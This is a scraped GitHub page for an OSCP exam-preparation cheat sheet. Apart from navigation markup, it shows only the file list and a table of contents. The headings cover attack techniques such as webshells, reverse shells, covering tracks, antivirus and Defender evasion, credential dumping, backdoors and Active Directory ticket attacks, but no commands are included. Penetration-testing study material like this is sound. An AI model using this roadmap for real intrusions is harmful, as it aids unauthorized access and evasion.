    <path d="M1.5 3.25a2.25 2.25 0 1 1 3 2.122v5.256a2.251 2.251 0 1 1-1.5 0V5.372A2.25 2.25 0 0 1 1.5 3.25Zm5.677-.177L9.573.677A.25.25 0 0 1 10 .854V2.5h1A2.5 2.5 0 0 1 13.5 5v5.628a2.251 2.251 0 1 1-1.5 0V5a1 1 0 0 0-1-1h-1v1.646a.25.25 0 0 1-.427.177L7.177 3.427a.25.25 0 0 1 0-.354ZM3.75 2.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm0 9.5a.75.75 0 1 0 0 1.5.75.75 0 0 0 0-1.5Zm8.25.75a.75.75 0 1 0 1.5 0 .75.75 0 0 0-1.5 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Pull requests
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i3actions-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-3b54076c-60ea-4d1a-a104-eb350df3381a" href="/camercu/oscp-prep/actions" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-play">
    <path d="M8 0a8 8 0 1 1 0 16A8 8 0 0 1 8 0ZM1.5 8a6.5 6.5 0 1 0 13 0 6.5 6.5 0 0 0-13 0Zm4.879-2.773 4.264 2.559a.25.25 0 0 1 0 .428l-4.264 2.559A.25.25 0 0 1 6 10.559V5.442a.25.25 0 0 1 .379-.215Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Actions
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i4projects-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-52f7bb42-9b22-4fc0-8bf6-f20cd1ac0944" href="/camercu/oscp-prep/projects" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-table">
    <path d="M0 1.75C0 .784.784 0 1.75 0h12.5C15.216 0 16 .784 16 1.75v12.5A1.75 1.75 0 0 1 14.25 16H1.75A1.75 1.75 0 0 1 0 14.25ZM6.5 6.5v8h7.75a.25.25 0 0 0 .25-.25V6.5Zm8-1.5V1.75a.25.25 0 0 0-.25-.25H6.5V5Zm-13 1.5v7.75c0 .138.112.25.25.25H5v-8ZM5 5V1.5H1.75a.25.25 0 0 0-.25.25V5Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Projects
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i5security-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-e1c3e9db-b6a2-420a-aa6a-d08e32cabb6b" href="/camercu/oscp-prep/security" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-shield">
    <path d="M7.467.133a1.748 1.748 0 0 1 1.066 0l5.25 1.68A1.75 1.75 0 0 1 15 3.48V7c0 1.566-.32 3.182-1.303 4.682-.983 1.498-2.585 2.813-5.032 3.855a1.697 1.697 0 0 1-1.33 0c-2.447-1.042-4.049-2.357-5.032-3.855C1.32 10.182 1 8.566 1 7V3.48a1.75 1.75 0 0 1 1.217-1.667Zm.61 1.429a.25.25 0 0 0-.153 0l-5.25 1.68a.25.25 0 0 0-.174.238V7c0 1.358.275 2.666 1.057 3.86.784 1.194 2.121 2.34 4.366 3.297a.196.196 0 0 0 .154 0c2.245-.956 3.582-2.104 4.366-3.298C13.225 9.666 13.5 8.36 13.5 7V3.48a.251.251 0 0 0-.174-.237l-5.25-1.68ZM8.75 4.75v3a.75.75 0 0 1-1.5 0v-3a.75.75 0 0 1 1.5 0ZM9 10.5a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Security
</span>      
</a>
  
</li>
        <li hidden="hidden" data-menu-item="i6insights-tab" data-targets="action-list.items" role="none" data-view-component="true" class="ActionListItem">
    
    
    <a tabindex="-1" id="item-73968be8-f7f7-440e-9b97-358c840af826" href="/camercu/oscp-prep/pulse" role="menuitem" data-view-component="true" class="ActionListContent ActionListContent--visual16">
        <span class="ActionListItem-visual ActionListItem-visual--leading">
          <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-graph">
    <path d="M1.5 1.75V13.5h13.75a.75.75 0 0 1 0 1.5H.75a.75.75 0 0 1-.75-.75V1.75a.75.75 0 0 1 1.5 0Zm14.28 2.53-5.25 5.25a.75.75 0 0 1-1.06 0L7 7.06 4.28 9.78a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042l3.25-3.25a.75.75 0 0 1 1.06 0L10 7.94l4.72-4.72a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042Z"></path>
</svg>
        </span>
      
        <span data-view-component="true" class="ActionListItem-label">
          Insights
</span>      
</a>
  
</li>
</ul>    
</div></action-list>


</div>
      
</div></anchored-position>  </focus-group>
</action-menu></div>
</nav>

  </div>

  



<turbo-frame id="repo-content-turbo-frame" target="_top" data-turbo-action="advance" class="">
    <div id="repo-content-pjax-container" class="repository-content " >
    



    
      
    








<react-app
  app-name="react-code-view"
  initial-path="/camercu/oscp-prep/blob/main/CHEATSHEET.md"
    style="display: block; min-height: calc(100vh - 64px);"
  data-attempted-ssr="true"
  data-ssr="false"
  data-lazy="false"
  data-alternate="false"
>
  
  <script type="application/json" data-target="react-app.embeddedData">{"payload":{"allShortcutsEnabled":false,"fileTree":{"":{"items":[{"name":"assets","path":"assets","contentType":"directory"},{"name":"tools","path":"tools","contentType":"directory"},{"name":"wordlists","path":"wordlists","contentType":"directory"},{"name":"CHEATSHEET.md","path":"CHEATSHEET.md","contentType":"file"},{"name":"README.md","path":"README.md","contentType":"file"},{"name":"privesc-tree.jpg","path":"privesc-tree.jpg","contentType":"file"}],"totalCount":6}},"fileTreeProcessingTime":2.495717,"foldersToFetch":[],"repo":{"id":362483662,"defaultBranch":"main","name":"oscp-prep","ownerLogin":"camercu","currentUserCanPush":false,"isFork":false,"isEmpty":false,"createdAt":"2021-04-28T13:47:48.000Z","ownerAvatar":"https://avatars.githubusercontent.com/u/6279092?v=4","public":true,"private":false,"isOrgOwned":false},"codeLineWrapEnabled":false,"symbolsExpanded":false,"treeExpanded":true,"refInfo":{"name":"main","listCacheKey":"v0:1660613066.405768","canEdit":false,"refType":"branch","currentOid":"cb753fb0d784bab431c7310d95b7cdb9a674ccb0"},"path":"CHEATSHEET.md","currentUser":null,"blob":{"rawLines":null,"stylingDirectives":null,"colorizedLines":null,"csv":null,"csvError":null,"dependabotInfo":{"showConfigurationBanner":false,"configFilePath":null,"networkDependabotPath":"/camercu/oscp-prep/network/updates","dismissConfigurationNoticePath":"/settings/dismiss-notice/dependabot_configuration_notice","configurationNoticeDismissed":null},"displayName":"CHEATSHEET.md","displayUrl":"https://github.com/camercu/oscp-prep/blob/main/CHEATSHEET.md?raw=true","headerInfo":{"blobSize":"289 KB","deleteTooltip":"You must be signed in to make or propose changes","editTooltip":"You must be signed in to make or propose changes","ghDesktopPath":"https://desktop.github.com","isGitLfs":false,"onBranch":true,"shortPath":"f2680e8","siteNavLoginPath":"/login?return_to=https%3A%2F%2Fgithub.com%2Fcamercu%2Foscp-prep%2Fblob%2Fmain%2FCHEATSHEET.md","isCSV":false,"isRichtext":true,"toc":[{"level":1,"text":"1 Scanning","anchor":"1-scanning","htmlText":"1 Scanning"},{"level":2,"text":"1.1 Rustscan","anchor":"11-rustscan","htmlText":"1.1 Rustscan"},{"level":2,"text":"1.2 Nmap","anchor":"12-nmap","htmlText":"1.2 Nmap"},{"level":2,"text":"1.3 Nessus","anchor":"13-nessus","htmlText":"1.3 Nessus"},{"level":2,"text":"1.4 Windows Port Scanning","anchor":"14-windows-port-scanning","htmlText":"1.4 Windows Port Scanning"},{"level":2,"text":"1.5 Bash Ping Scanner","anchor":"15-bash-ping-scanner","htmlText":"1.5 Bash Ping Scanner"},{"level":2,"text":"1.6 Bash Port Scanner","anchor":"16-bash-port-scanner","htmlText":"1.6 Bash Port Scanner"},{"level":2,"text":"1.7 IPv6 to bypass IPv4 filters","anchor":"17-ipv6-to-bypass-ipv4-filters","htmlText":"1.7 IPv6 to bypass IPv4 filters"},{"level":2,"text":"1.8 Whois","anchor":"18-whois","htmlText":"1.8 Whois"},{"level":1,"text":"2 Services","anchor":"2-services","htmlText":"2 Services"},{"level":2,"text":"2.1 FTP - 21","anchor":"21-ftp---21","htmlText":"2.1 FTP - 21"},{"level":2,"text":"2.2 SSH/SFTP - 22","anchor":"22-sshsftp---22","htmlText":"2.2 SSH/SFTP - 22"},{"level":3,"text":"2.2.1 SSH Credential Bruteforcing","anchor":"221-ssh-credential-bruteforcing","htmlText":"2.2.1 SSH Credential Bruteforcing"},{"level":3,"text":"2.2.2 Disable SSH Host Key Checking","anchor":"222-disable-ssh-host-key-checking","htmlText":"2.2.2 Disable SSH Host Key Checking"},{"level":3,"text":"2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH","anchor":"223-use-legacy-key-exchange-algorithm-or-cipher-with-ssh","htmlText":"2.2.3 Use Legacy Key Exchange Algorithm or Cipher with SSH"},{"level":2,"text":"2.3 SMTP/s - 25,465,587","anchor":"23-smtps---25465587","htmlText":"2.3 SMTP/s - 25,465,587"},{"level":2,"text":"2.4 DNS - 53","anchor":"24-dns---53","htmlText":"2.4 DNS - 53"},{"level":3,"text":"2.4.1 DNS Zone Transfer","anchor":"241-dns-zone-transfer","htmlText":"2.4.1 DNS Zone Transfer"},{"level":3,"text":"2.4.2 Bruteforcing DNS Records","anchor":"242-bruteforcing-dns-records","htmlText":"2.4.2 Bruteforcing DNS Records"},{"level":2,"text":"2.5 Finger - 79","anchor":"25-finger---79","htmlText":"2.5 Finger - 79"},{"level":2,"text":"2.6 HTTP(s) - 80,443","anchor":"26-https---80443","htmlText":"2.6 HTTP(s) - 80,443"},{"level":3,"text":"2.6.1 Web Scanning/Enumeration","anchor":"261-web-scanningenumeration","htmlText":"2.6.1 Web Scanning/Enumeration"},{"level":3,"text":"2.6.2 Web Credential Bruteforcing","anchor":"262-web-credential-bruteforcing","htmlText":"2.6.2 Web Credential Bruteforcing"},{"level":3,"text":"2.6.3 SQL Injection","anchor":"263-sql-injection","htmlText":"2.6.3 SQL Injection"},{"level":4,"text":"2.6.3.1 UNION SQLi technique","anchor":"2631-union-sqli-technique","htmlText":"2.6.3.1 UNION SQLi technique"},{"level":4,"text":"2.6.3.2 Blind SQLi","anchor":"2632-blind-sqli","htmlText":"2.6.3.2 Blind SQLi"},{"level":4,"text":"2.6.3.3 Exploiting NoSQL Injection","anchor":"2633-exploiting-nosql-injection","htmlText":"2.6.3.3 Exploiting NoSQL Injection"},{"level":3,"text":"2.6.4 Directory Traversal","anchor":"264-directory-traversal","htmlText":"2.6.4 Directory Traversal"},{"level":3,"text":"2.6.5 LFI/RFI","anchor":"265-lfirfi","htmlText":"2.6.5 LFI/RFI"},{"level":4,"text":"2.6.5.1 PHP Wrappers","anchor":"2651-php-wrappers","htmlText":"2.6.5.1 PHP Wrappers"},{"level":4,"text":"2.6.5.2 One-liner PHP Webshells","anchor":"2652-one-liner-php-webshells","htmlText":"2.6.5.2 One-liner PHP Webshells"},{"level":3,"text":"2.6.6 Command Injection","anchor":"266-command-injection","htmlText":"2.6.6 Command Injection"},{"level":3,"text":"2.6.7 Cross-Site Scripting (XSS)","anchor":"267-cross-site-scripting-xss","htmlText":"2.6.7 Cross-Site Scripting (XSS)"},{"level":3,"text":"2.6.8 WordPress","anchor":"268-wordpress","htmlText":"2.6.8 WordPress"},{"level":3,"text":"2.6.9 Drupal","anchor":"269-drupal","htmlText":"2.6.9 Drupal"},{"level":3,"text":"2.6.10 Joomla","anchor":"2610-joomla","htmlText":"2.6.10 Joomla"},{"level":2,"text":"2.7 Kerberos - 88,749","anchor":"27-kerberos---88749","htmlText":"2.7 Kerberos - 88,749"},{"level":2,"text":"2.8 POP - 110,995","anchor":"28-pop---110995","htmlText":"2.8 POP - 110,995"},{"level":2,"text":"2.9 RPCbind - 111","anchor":"29-rpcbind---111","htmlText":"2.9 RPCbind - 111"},{"level":2,"text":"2.10 NNTP - 119","anchor":"210-nntp---119","htmlText":"2.10 NNTP - 119"},{"level":2,"text":"2.11 MSRPC and NetBIOS - 135,137,139","anchor":"211-msrpc-and-netbios---135137139","htmlText":"2.11 MSRPC and NetBIOS - 135,137,139"},{"level":2,"text":"2.12 SMB - 445","anchor":"212-smb---445","htmlText":"2.12 SMB - 445"},{"level":3,"text":"2.12.1 SMB Credential Bruteforcing","anchor":"2121-smb-credential-bruteforcing","htmlText":"2.12.1 SMB Credential Bruteforcing"},{"level":3,"text":"2.12.2 Interacting with SMB","anchor":"2122-interacting-with-smb","htmlText":"2.12.2 Interacting with SMB"},{"level":2,"text":"2.13 SNMP(s) - 161,162,10161,10162","anchor":"213-snmps---1611621016110162","htmlText":"2.13 SNMP(s) - 161,162,10161,10162"},{"level":3,"text":"2.13.1 Exploring MIBs with snmptranslate","anchor":"2131-exploring-mibs-with-snmptranslate","htmlText":"2.13.1 Exploring MIBs with snmptranslate"},{"level":3,"text":"2.13.2 RCE with SNMP","anchor":"2132-rce-with-snmp","htmlText":"2.13.2 RCE with SNMP"},{"level":2,"text":"2.14 LDAP(s) - 389,636","anchor":"214-ldaps---389636","htmlText":"2.14 LDAP(s) - 389,636"},{"level":2,"text":"2.15 MSSQL - 1443","anchor":"215-mssql---1443","htmlText":"2.15 MSSQL - 1443"},{"level":3,"text":"2.15.1 MSSQL Credential Bruteforcing","anchor":"2151-mssql-credential-bruteforcing","htmlText":"2.15.1 MSSQL Credential Bruteforcing"},{"level":3,"text":"2.15.2 MSSQL Interaction","anchor":"2152-mssql-interaction","htmlText":"2.15.2 MSSQL Interaction"},{"level":3,"text":"2.15.3 MSSQL Command Execution","anchor":"2153-mssql-command-execution","htmlText":"2.15.3 MSSQL Command Execution"},{"level":2,"text":"2.16 NFS - 2049","anchor":"216-nfs---2049","htmlText":"2.16 NFS - 2049"},{"level":2,"text":"2.17 MySQL - 3306","anchor":"217-mysql---3306","htmlText":"2.17 MySQL - 3306"},{"level":3,"text":"2.17.1 MySQL UDF Exploit","anchor":"2171-mysql-udf-exploit","htmlText":"2.17.1 MySQL UDF Exploit"},{"level":3,"text":"2.17.2 Grabbing MySQL Passwords","anchor":"2172-grabbing-mysql-passwords","htmlText":"2.17.2 Grabbing MySQL Passwords"},{"level":3,"text":"2.17.3 Useful MySQL Files","anchor":"2173-useful-mysql-files","htmlText":"2.17.3 Useful MySQL Files"},{"level":2,"text":"2.18 RDP - 3389","anchor":"218-rdp---3389","htmlText":"2.18 RDP - 3389"},{"level":2,"text":"2.19 PostgreSQL - 5432","anchor":"219-postgresql---5432","htmlText":"2.19 PostgreSQL - 5432"},{"level":2,"text":"2.20 VNC - 5900,5800","anchor":"220-vnc---59005800","htmlText":"2.20 VNC - 5900,5800"},{"level":2,"text":"2.21 MongoDB - 27017","anchor":"221-mongodb---27017","htmlText":"2.21 MongoDB - 27017"},{"level":2,"text":"2.22 Amazon Web Services (AWS) S3 Buckets","anchor":"222-amazon-web-services-aws-s3-buckets","htmlText":"2.22 Amazon Web Services (AWS) S3 Buckets"},{"level":3,"text":"2.22.1 AWS Identity and Access Management (IAM)","anchor":"2221-aws-identity-and-access-management-iam","htmlText":"2.22.1 AWS Identity and Access Management (IAM)"},{"level":4,"text":"2.22.1.1 IAM Access Keys","anchor":"22211-iam-access-keys","htmlText":"2.22.1.1 IAM Access Keys"},{"level":4,"text":"2.22.1.2 Conducting Reconnaissance with IAM","anchor":"22212-conducting-reconnaissance-with-iam","htmlText":"2.22.1.2 Conducting Reconnaissance with IAM"},{"level":4,"text":"2.22.1.3 AWS ARNs","anchor":"22213-aws-arns","htmlText":"2.22.1.3 AWS ARNs"},{"level":1,"text":"3 Exploitation","anchor":"3-exploitation","htmlText":"3 Exploitation"},{"level":2,"text":"3.1 Searchsploit","anchor":"31-searchsploit","htmlText":"3.1 Searchsploit"},{"level":2,"text":"3.2 Cracking Password Hashes","anchor":"32-cracking-password-hashes","htmlText":"3.2 Cracking Password Hashes"},{"level":3,"text":"3.2.1 Identifying Unknown Hash Format","anchor":"321-identifying-unknown-hash-format","htmlText":"3.2.1 Identifying Unknown Hash Format"},{"level":3,"text":"3.2.2 Cracking with John The Ripper","anchor":"322-cracking-with-john-the-ripper","htmlText":"3.2.2 Cracking with John The Ripper"},{"level":3,"text":"3.2.3 Cracking with Hashcat","anchor":"323-cracking-with-hashcat","htmlText":"3.2.3 Cracking with Hashcat"},{"level":3,"text":"3.2.4 Making Custom Wordlists","anchor":"324-making-custom-wordlists","htmlText":"3.2.4 Making Custom Wordlists"},{"level":3,"text":"3.2.5 Password Cracking Examples","anchor":"325-password-cracking-examples","htmlText":"3.2.5 Password Cracking Examples"},{"level":2,"text":"3.3 Reverse Shells","anchor":"33-reverse-shells","htmlText":"3.3 Reverse Shells"},{"level":3,"text":"3.3.1 Running a detached/daemonized process on Linux","anchor":"331-running-a-detacheddaemonized-process-on-linux","htmlText":"3.3.1 Running a detached/daemonized process on Linux"},{"level":3,"text":"3.3.2 Covering your tracks","anchor":"332-covering-your-tracks","htmlText":"3.3.2 Covering your tracks"},{"level":3,"text":"3.3.3 Upgrading to Interactive Shell","anchor":"333-upgrading-to-interactive-shell","htmlText":"3.3.3 Upgrading to Interactive Shell"},{"level":2,"text":"3.4 Metasploit","anchor":"34-metasploit","htmlText":"3.4 Metasploit"},{"level":3,"text":"3.4.1 Interacting with Metasploit via msfconsole","anchor":"341-interacting-with-metasploit-via-msfconsole","htmlText":"3.4.1 Interacting with Metasploit via msfconsole"},{"level":3,"text":"3.4.2 Metasploit Resource Scripts","anchor":"342-metasploit-resource-scripts","htmlText":"3.4.2 Metasploit Resource Scripts"},{"level":3,"text":"3.4.3 Meterpreter command basics","anchor":"343-meterpreter-command-basics","htmlText":"3.4.3 Meterpreter command basics"},{"level":3,"text":"3.4.4 Metasploit Modules and Payloads","anchor":"344-metasploit-modules-and-payloads","htmlText":"3.4.4 Metasploit Modules and Payloads"},{"level":2,"text":"3.5 Buffer Overflows","anchor":"35-buffer-overflows","htmlText":"3.5 Buffer Overflows"},{"level":2,"text":"3.6 Client-Side Attacks","anchor":"36-client-side-attacks","htmlText":"3.6 Client-Side Attacks"},{"level":3,"text":"3.6.1 Phishing Emails","anchor":"361-phishing-emails","htmlText":"3.6.1 Phishing Emails"},{"level":3,"text":"3.6.2 HTA Files","anchor":"362-hta-files","htmlText":"3.6.2 HTA Files"},{"level":3,"text":"3.6.3 Malicious Office Macros","anchor":"363-malicious-office-macros","htmlText":"3.6.3 Malicious Office Macros"},{"level":3,"text":"3.6.4 Windows Library Files","anchor":"364-windows-library-files","htmlText":"3.6.4 Windows Library Files"},{"level":1,"text":"4 Windows","anchor":"4-windows","htmlText":"4 Windows"},{"level":2,"text":"4.1 Basic Windows Post-Exploit Enumeration","anchor":"41-basic-windows-post-exploit-enumeration","htmlText":"4.1 Basic Windows Post-Exploit Enumeration"},{"level":3,"text":"4.1.1 Watching for Windows Process to run","anchor":"411-watching-for-windows-process-to-run","htmlText":"4.1.1 Watching for Windows Process to run"},{"level":2,"text":"4.2 Windows Privilege Escalation","anchor":"42-windows-privilege-escalation","htmlText":"4.2 Windows Privilege Escalation"},{"level":3,"text":"4.2.1 Check Windows File Permissions","anchor":"421-check-windows-file-permissions","htmlText":"4.2.1 Check Windows File Permissions"},{"level":3,"text":"4.2.2 Windows Service Escalation - Registry","anchor":"422-windows-service-escalation---registry","htmlText":"4.2.2 Windows Service Escalation - Registry"},{"level":3,"text":"4.2.3 Windows Binary Hijacking","anchor":"423-windows-binary-hijacking","htmlText":"4.2.3 Windows Binary Hijacking"},{"level":3,"text":"4.2.4 Windows DLL Hijacking","anchor":"424-windows-dll-hijacking","htmlText":"4.2.4 Windows DLL Hijacking"},{"level":3,"text":"4.2.5 Unquoted Windows Service Paths","anchor":"425-unquoted-windows-service-paths","htmlText":"4.2.5 Unquoted Windows Service Paths"},{"level":3,"text":"4.2.6 Windows Token Impersonation","anchor":"426-windows-token-impersonation","htmlText":"4.2.6 Windows Token Impersonation"},{"level":4,"text":"4.2.6.1 Windows Token Impersonation with GodPotato","anchor":"4261-windows-token-impersonation-with-godpotato","htmlText":"4.2.6.1 Windows Token Impersonation with GodPotato"},{"level":4,"text":"4.2.6.2 Windows Token Impersonation with PrintSpoofer","anchor":"4262-windows-token-impersonation-with-printspoofer","htmlText":"4.2.6.2 Windows Token Impersonation with PrintSpoofer"},{"level":4,"text":"4.2.6.3 Windows Token Impersonation with RoguePotato","anchor":"4263-windows-token-impersonation-with-roguepotato","htmlText":"4.2.6.3 Windows Token Impersonation with RoguePotato"},{"level":3,"text":"4.2.7 Windows Pass-The-Hash Attacks","anchor":"427-windows-pass-the-hash-attacks","htmlText":"4.2.7 Windows Pass-The-Hash Attacks"},{"level":3,"text":"4.2.8 Windows NTLMv2 Hash Relay Attack","anchor":"428-windows-ntlmv2-hash-relay-attack","htmlText":"4.2.8 Windows NTLMv2 Hash Relay Attack"},{"level":2,"text":"4.3 Antivirus \u0026 Firewall Evasion","anchor":"43-antivirus--firewall-evasion","htmlText":"4.3 Antivirus \u0026amp; Firewall Evasion"},{"level":3,"text":"4.3.1 Cross-Compiling Windows Binaries on Linux","anchor":"431-cross-compiling-windows-binaries-on-linux","htmlText":"4.3.1 Cross-Compiling Windows Binaries on Linux"},{"level":3,"text":"4.3.2 Shellter","anchor":"432-shellter","htmlText":"4.3.2 Shellter"},{"level":3,"text":"4.3.3 Windows Process Injection","anchor":"433-windows-process-injection","htmlText":"4.3.3 Windows Process Injection"},{"level":3,"text":"4.3.4 Windows AMSI Bypass","anchor":"434-windows-amsi-bypass","htmlText":"4.3.4 Windows AMSI Bypass"},{"level":3,"text":"4.3.5 Turn off Windows Firewall","anchor":"435-turn-off-windows-firewall","htmlText":"4.3.5 Turn off Windows Firewall"},{"level":3,"text":"4.3.6 Turn off Windows Defender","anchor":"436-turn-off-windows-defender","htmlText":"4.3.6 Turn off Windows Defender"},{"level":3,"text":"4.3.7 Windows Encoding/Decoding with LOLBAS","anchor":"437-windows-encodingdecoding-with-lolbas","htmlText":"4.3.7 Windows Encoding/Decoding with LOLBAS"},{"level":3,"text":"4.3.8 Execute Inline Tasks with MSBuild.exe","anchor":"438-execute-inline-tasks-with-msbuildexe","htmlText":"4.3.8 Execute Inline Tasks with MSBuild.exe"},{"level":3,"text":"4.3.9 Custom Windows TCP Reverse Shell","anchor":"439-custom-windows-tcp-reverse-shell","htmlText":"4.3.9 Custom Windows TCP Reverse Shell"},{"level":3,"text":"4.3.10 Windows UAC Bypass","anchor":"4310-windows-uac-bypass","htmlText":"4.3.10 Windows UAC Bypass"},{"level":2,"text":"4.4 Windows Passwords \u0026 Hashes","anchor":"44-windows-passwords--hashes","htmlText":"4.4 Windows Passwords \u0026amp; Hashes"},{"level":3,"text":"4.4.1 Windows Passwords in Files","anchor":"441-windows-passwords-in-files","htmlText":"4.4.1 Windows Passwords in Files"},{"level":3,"text":"4.4.2 Windows Passwords in Registry","anchor":"442-windows-passwords-in-registry","htmlText":"4.4.2 Windows Passwords in Registry"},{"level":3,"text":"4.4.3 Grabbing Hashes from Windows","anchor":"443-grabbing-hashes-from-windows","htmlText":"4.4.3 Grabbing Hashes from Windows"},{"level":4,"text":"4.4.3.1 Dumping Hashes from Windows Registry Backups","anchor":"4431-dumping-hashes-from-windows-registry-backups","htmlText":"4.4.3.1 Dumping Hashes from Windows Registry Backups"},{"level":4,"text":"4.4.3.2 Dumping Hashes from Windows Domain Controller","anchor":"4432-dumping-hashes-from-windows-domain-controller","htmlText":"4.4.3.2 Dumping Hashes from Windows Domain Controller"},{"level":4,"text":"4.4.3.3 Grab NTLMv2 Hashes Using Responder","anchor":"4433-grab-ntlmv2-hashes-using-responder","htmlText":"4.4.3.3 Grab NTLMv2 Hashes Using Responder"},{"level":4,"text":"4.4.3.4 Dump Hashes and Passwords Using Crackmapexec","anchor":"4434-dump-hashes-and-passwords-using-crackmapexec","htmlText":"4.4.3.4 Dump Hashes and Passwords Using Crackmapexec"},{"level":4,"text":"4.4.3.5 Dump Hashes and Passwords Using mimikatz","anchor":"4435-dump-hashes-and-passwords-using-mimikatz","htmlText":"4.4.3.5 Dump Hashes and Passwords Using mimikatz"},{"level":2,"text":"4.5 Miscellaneous Windows Commands","anchor":"45-miscellaneous-windows-commands","htmlText":"4.5 Miscellaneous Windows Commands"},{"level":2,"text":"4.6 Windows Persistence","anchor":"46-windows-persistence","htmlText":"4.6 Windows Persistence"},{"level":3,"text":"4.6.1 Add RDP User","anchor":"461-add-rdp-user","htmlText":"4.6.1 Add RDP User"},{"level":3,"text":"4.6.2 Remote SYSTEM Backdoor","anchor":"462-remote-system-backdoor","htmlText":"4.6.2 Remote SYSTEM Backdoor"},{"level":4,"text":"4.6.2.1 Backdoor Windows Services","anchor":"4621-backdoor-windows-services","htmlText":"4.6.2.1 Backdoor Windows Services"},{"level":4,"text":"4.6.2.2 Backdoor Service with PSExec","anchor":"4622-backdoor-service-with-psexec","htmlText":"4.6.2.2 Backdoor Service with PSExec"},{"level":4,"text":"4.6.2.3 Backdoor Scheduled Tasks","anchor":"4623-backdoor-scheduled-tasks","htmlText":"4.6.2.3 Backdoor Scheduled Tasks"},{"level":3,"text":"4.6.3 Backdoor via WMIC","anchor":"463-backdoor-via-wmic","htmlText":"4.6.3 Backdoor via WMIC"},{"level":2,"text":"4.7 Windows Files of Interest","anchor":"47-windows-files-of-interest","htmlText":"4.7 Windows Files of Interest"},{"level":1,"text":"5 Active Directory","anchor":"5-active-directory","htmlText":"5 Active Directory"},{"level":2,"text":"5.1 Active Directory Enumeration","anchor":"51-active-directory-enumeration","htmlText":"5.1 Active Directory Enumeration"},{"level":3,"text":"5.1.1 Quick Active Directory Enumeration Script","anchor":"511-quick-active-directory-enumeration-script","htmlText":"5.1.1 Quick Active Directory Enumeration Script"},{"level":3,"text":"5.1.2 Domain Enumeration with PowerView","anchor":"512-domain-enumeration-with-powerview","htmlText":"5.1.2 Domain Enumeration with PowerView"},{"level":3,"text":"5.1.3 Domain Enumeration with BloodHound","anchor":"513-domain-enumeration-with-bloodhound","htmlText":"5.1.3 Domain Enumeration with BloodHound"},{"level":2,"text":"5.2 Attacking Active Directory Authentication","anchor":"52-attacking-active-directory-authentication","htmlText":"5.2 Attacking Active Directory Authentication"},{"level":3,"text":"5.2.1 Change Active Directory Credentials","anchor":"521-change-active-directory-credentials","htmlText":"5.2.1 Change Active Directory Credentials"},{"level":3,"text":"5.2.2 Password Spraying in Active Directory","anchor":"522-password-spraying-in-active-directory","htmlText":"5.2.2 Password Spraying in Active Directory"},{"level":3,"text":"5.2.3 AS-REP Roasting","anchor":"523-as-rep-roasting","htmlText":"5.2.3 AS-REP Roasting"},{"level":3,"text":"5.2.4 Kerberoasting","anchor":"524-kerberoasting","htmlText":"5.2.4 Kerberoasting"},{"level":3,"text":"5.2.5 Silver Ticket","anchor":"525-silver-ticket","htmlText":"5.2.5 Silver Ticket"},{"level":2,"text":"5.3 Lateral Movement in Active Directory","anchor":"53-lateral-movement-in-active-directory","htmlText":"5.3 Lateral Movement in Active Directory"},{"level":3,"text":"5.3.1 PsExec on Active Directory","anchor":"531-psexec-on-active-directory","htmlText":"5.3.1 PsExec on Active Directory"},{"level":3,"text":"5.3.2 WMI and WinRM on Active Directory","anchor":"532-wmi-and-winrm-on-active-directory","htmlText":"5.3.2 WMI and WinRM on Active Directory"},{"level":3,"text":"5.3.3 Overpass-the-Hash","anchor":"533-overpass-the-hash","htmlText":"5.3.3 Overpass-the-Hash"},{"level":3,"text":"5.3.4 Pass-the-Ticket","anchor":"534-pass-the-ticket","htmlText":"5.3.4 Pass-the-Ticket"},{"level":3,"text":"5.3.5 DCOM","anchor":"535-dcom","htmlText":"5.3.5 DCOM"},{"level":2,"text":"5.4 Active Directory Persistence","anchor":"54-active-directory-persistence","htmlText":"5.4 Active Directory Persistence"},{"level":3,"text":"5.4.1 Domain Controller Synchronization (DCSync)","anchor":"541-domain-controller-synchronization-dcsync","htmlText":"5.4.1 Domain Controller Synchronization (DCSync)"},{"level":3,"text":"5.4.2 Volume Shadow Copy","anchor":"542-volume-shadow-copy","htmlText":"5.4.2 Volume Shadow Copy"},{"level":3,"text":"5.4.3 Golden Ticket","anchor":"543-golden-ticket","htmlText":"5.4.3 Golden Ticket"},{"level":1,"text":"6 Linux","anchor":"6-linux","htmlText":"6 Linux"},{"level":2,"text":"6.1 Basic Linux Post-Exploit Enumeration","anchor":"61-basic-linux-post-exploit-enumeration","htmlText":"6.1 Basic Linux Post-Exploit Enumeration"},{"level":3,"text":"6.1.1 Watching for Linux Process Changes","anchor":"611-watching-for-linux-process-changes","htmlText":"6.1.1 Watching for Linux Process Changes"},{"level":2,"text":"6.2 Linux Privilege Escalation","anchor":"62-linux-privilege-escalation","htmlText":"6.2 Linux Privilege Escalation"},{"level":3,"text":"6.2.1 Abusing 